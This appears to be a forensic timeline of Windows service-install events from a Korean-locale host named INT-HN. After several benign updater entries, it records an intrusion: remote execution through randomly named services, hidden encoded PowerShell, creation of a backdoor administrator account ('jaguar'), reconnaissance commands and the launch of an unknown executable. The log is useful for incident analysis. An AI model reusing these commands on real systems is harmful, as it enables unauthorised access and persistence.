Timestamp,Logged,Hostname,ExtIP,Description,Details,-,SourceFile
2024-08-14 18:24:17,Logged,INT-HN,-,서비스 설치,"Service: GoogleUpdater InternalService 129.0.6651.0 (GoogleUpdaterInternalService129.0.6651.0), Path: ""C:\Program Files (x86)\Google\GoogleUpdater\129.0.6651.0\updater.exe"" --system --windows-service --service=update-internal, Type: 사용자 모드 서비스, StartType: 자동 시작",-,System.evtx
2024-08-14 19:29:17,Logged,INT-HN,-,서비스 설치,"Service: GoogleUpdater Service 129.0.6651.0 (GoogleUpdaterService129.0.6651.0), Path: ""C:\Program Files (x86)\Google\GoogleUpdater\129.0.6651.0\updater.exe"" --system --windows-service --service=update, Type: 사용자 모드 서비스, StartType: 자동 시작",-,System.evtx
2024-08-28 01:30:46,Logged,INT-HN,-,서비스 설치,"Service: GoogleUpdater InternalService 129.0.6651.2 (GoogleUpdaterInternalService129.0.6651.2), Path: ""C:\Program Files (x86)\Google\GoogleUpdater\129.0.6651.2\updater.exe"" --system --windows-service --service=update-internal, Type: 사용자 모드 서비스, StartType: 자동 시작",-,System.evtx
2024-08-28 02:35:46,Logged,INT-HN,-,서비스 설치,"Service: GoogleUpdater Service 129.0.6651.2 (GoogleUpdaterService129.0.6651.2), Path: ""C:\Program Files (x86)\Google\GoogleUpdater\129.0.6651.2\updater.exe"" --system --windows-service --service=update, Type: 사용자 모드 서비스, StartType: 자동 시작",-,System.evtx
2024-08-30 01:36:46,Logged,INT-HN,-,서비스 설치,"Service: GoogleUpdater InternalService 130.0.6679.0 (GoogleUpdaterInternalService130.0.6679.0), Path: ""C:\Program Files (x86)\Google\GoogleUpdater\130.0.6679.0\updater.exe"" --system --windows-service --service=update-internal, Type: 사용자 모드 서비스, StartType: 자동 시작",-,System.evtx
2024-08-30 02:41:46,Logged,INT-HN,-,서비스 설치,"Service: GoogleUpdater Service 130.0.6679.0 (GoogleUpdaterService130.0.6679.0), Path: ""C:\Program Files (x86)\Google\GoogleUpdater\130.0.6679.0\updater.exe"" --system --windows-service --service=update, Type: 사용자 모드 서비스, StartType: 자동 시작",-,System.evtx
2024-09-06 07:28:30,Logged,INT-HN,-,서비스 설치,"Service: AccessData Driver, Path: C:\Users\ADMINI~1\AppData\Local\Temp\2\ad_driver.sys, Type: 커널 모드 드라이버, StartType: 요청 시 시작",-,System.evtx
2024-09-25 04:16:29,Logged,INT-HN,-,서비스 설치,"Service: TeamViewer, Path: ""C:\Program Files\TeamViewer\TeamViewer_Service.exe"", Type: 사용자 모드 서비스, StartType: 자동 시작",-,System.evtx
2024-09-25 04:16:31,Logged,INT-HN,-,서비스 설치,"Service: Microsoft Edge 업데이트 서비스 (edgeupdate), Path: ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /svc, Type: 사용자 모드 서비스, StartType: 자동 시작",-,System.evtx
2024-09-25 04:16:31,Logged,INT-HN,-,서비스 설치,"Service: Microsoft Edge 업데이트 서비스 (edgeupdatem), Path: ""C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe"" /medsvc, Type: 사용자 모드 서비스, StartType: 요청 시 시작",-,System.evtx
2024-10-04 01:46:54,Logged,INT-HN,-,서비스 설치,"Service: 354f374, Path: \\INT-HN\ADMIN$\354f374.exe, Type: 사용자 모드 서비스, StartType: 요청 시 시작",-,System.evtx
2024-10-04 12:32:14,Logged,INT-HN,-,서비스 설치,"Service: GLMACCQz, Path: %COMSPEC% /Q /c echo cd  ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\bMDDhHLh.bat & %COMSPEC% /Q /c %SYSTEMROOT%\bMDDhHLh.bat & del %SYSTEMROOT%\bMDDhHLh.bat, Type: 사용자 모드 서비스, StartType: 요청 시 시작",-,System.evtx
2024-10-04 12:35:28,Logged,INT-HN,-,서비스 설치,"Service: GLMACCQz, Path: %COMSPEC% /Q /c echo powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAiADsAdwBoAG8AYQBtAGkA ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\vCcIOusC.bat & %COMSPEC% /Q /c %SYSTEMROOT%\vCcIOusC.bat & del %SYSTEMROOT%\vCcIOusC.bat, Type: 사용자 모드 서비스, StartType: 요청 시 시작",-,System.evtx
2024-10-04 12:38:01,Logged,INT-HN,-,서비스 설치,"Service: GLMACCQz, Path: %COMSPEC% /Q /c echo powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAiADsAbgBlAHQAIAB1AHMAZQByACAAagBhAGcAdQBhAHIAIABhAGQAbQBpAG4AQAAxADIAMwAhACAALwBhAGQAZAA= ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\NcwVapxG.bat & %COMSPEC% /Q /c %SYSTEMROOT%\NcwVapxG.bat & del %SYSTEMROOT%\NcwVapxG.bat, Type: 사용자 모드 서비스, StartType: 요청 시 시작",-,System.evtx
2024-10-04 12:39:05,Logged,INT-HN,-,서비스 설치,"Service: NEwszWYl, Path: %COMSPEC% /Q /c echo cd  ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\qdnqkHwy.bat & %COMSPEC% /Q /c %SYSTEMROOT%\qdnqkHwy.bat & del %SYSTEMROOT%\qdnqkHwy.bat, Type: 사용자 모드 서비스, StartType: 요청 시 시작",-,System.evtx
2024-10-04 12:39:17,Logged,INT-HN,-,서비스 설치,"Service: NEwszWYl, Path: %COMSPEC% /Q /c echo net user jaguar admin@123! /add ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\kvTrsKsQ.bat & %COMSPEC% /Q /c %SYSTEMROOT%\kvTrsKsQ.bat & del %SYSTEMROOT%\kvTrsKsQ.bat, Type: 사용자 모드 서비스, StartType: 요청 시 시작",-,System.evtx
2024-10-04 12:46:02,Logged,INT-HN,-,서비스 설치,"Service: NEwszWYl, Path: %COMSPEC% /Q /c echo net localgroup administrators jaguar /add ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\dxKKdDzm.bat & %COMSPEC% /Q /c %SYSTEMROOT%\dxKKdDzm.bat & del %SYSTEMROOT%\dxKKdDzm.bat, Type: 사용자 모드 서비스, StartType: 요청 시 시작",-,System.evtx
2024-10-04 12:49:10,Logged,INT-HN,-,서비스 설치,"Service: wVHlszQu, Path: %COMSPEC% /Q /c echo cd  ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\YFzawVBS.bat & %COMSPEC% /Q /c %SYSTEMROOT%\YFzawVBS.bat & del %SYSTEMROOT%\YFzawVBS.bat, Type: 사용자 모드 서비스, StartType: 요청 시 시작",-,System.evtx
2024-10-04 12:49:33,Logged,INT-HN,-,서비스 설치,"Service: wVHlszQu, Path: %COMSPEC% /Q /c echo net user ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\XkcMSlQe.bat & %COMSPEC% /Q /c %SYSTEMROOT%\XkcMSlQe.bat & del %SYSTEMROOT%\XkcMSlQe.bat, Type: 사용자 모드 서비스, StartType: 요청 시 시작",-,System.evtx
2024-10-04 13:00:48,Logged,INT-HN,-,서비스 설치,"Service: aVIEAIJC, Path: %COMSPEC% /Q /c echo cd  ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\gSImXLSx.bat & %COMSPEC% /Q /c %SYSTEMROOT%\gSImXLSx.bat & del %SYSTEMROOT%\gSImXLSx.bat, Type: 사용자 모드 서비스, StartType: 요청 시 시작",-,System.evtx
2024-10-04 13:00:55,Logged,INT-HN,-,서비스 설치,"Service: aVIEAIJC, Path: %COMSPEC% /Q /c echo whoami ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\tXNeLGlI.bat & %COMSPEC% /Q /c %SYSTEMROOT%\tXNeLGlI.bat & del %SYSTEMROOT%\tXNeLGlI.bat, Type: 사용자 모드 서비스, StartType: 요청 시 시작",-,System.evtx
2024-10-04 13:01:06,Logged,INT-HN,-,서비스 설치,"Service: aVIEAIJC, Path: %COMSPEC% /Q /c echo net user ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\KuOzgyzu.bat & %COMSPEC% /Q /c %SYSTEMROOT%\KuOzgyzu.bat & del %SYSTEMROOT%\KuOzgyzu.bat, Type: 사용자 모드 서비스, StartType: 요청 시 시작",-,System.evtx
2024-10-04 13:05:41,Logged,INT-HN,-,서비스 설치,"Service: aVIEAIJC, Path: %COMSPEC% /Q /c echo query user ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\mMdAFOtb.bat & %COMSPEC% /Q /c %SYSTEMROOT%\mMdAFOtb.bat & del %SYSTEMROOT%\mMdAFOtb.bat, Type: 사용자 모드 서비스, StartType: 요청 시 시작",-,System.evtx
2024-10-04 13:11:46,Logged,INT-HN,-,서비스 설치,"Service: aVIEAIJC, Path: %COMSPEC% /Q /c echo C:\Users\Administrator\Pictures\110.exe ^> \\%COMPUTERNAME%\C$\__output 2^>^&1 > %SYSTEMROOT%\VNEjVTzf.bat & %COMSPEC% /Q /c %SYSTEMROOT%\VNEjVTzf.bat & del %SYSTEMROOT%\VNEjVTzf.bat, Type: 사용자 모드 서비스, StartType: 요청 시 시작",-,System.evtx
